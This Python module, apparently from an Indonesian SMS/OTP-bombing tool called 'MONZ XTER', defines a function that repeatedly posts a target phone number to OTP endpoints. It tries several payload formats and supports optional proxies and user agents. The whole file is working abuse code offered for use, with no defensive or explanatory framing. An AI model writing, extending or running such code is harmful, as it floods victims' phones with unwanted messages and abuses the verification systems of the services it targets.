#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MONZ XTER PLAIN HANDLERS - RAW REQUEST HANDLING
"""

import requests
import json
from colorama import Fore, init

init(autoreset=True)

def send_otp_plain(target, endpoint, ua=None, proxy=None, timeout=5):
    """Send OTP using plain requests"""
    headers = {
        "User-Agent": ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "id-ID,id;q=0.9,en;q=0.8"
    }
    
    payloads = [
        {"phone": target, "method": "sms", "countryCode": "62"},
        {"phoneNumber": target, "type": "sms"},
        {"waid": target, "method": "sms"},
        {"phone": target, "via": "sms"}
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                endpoint,
                json=payload,
                headers=headers,
                proxies=proxy,
                timeout=timeout
            )
            
            if response.status_code in [200, 201, 202, 204]:
                return True
                
        except Exception as e:
            pass
    
    return False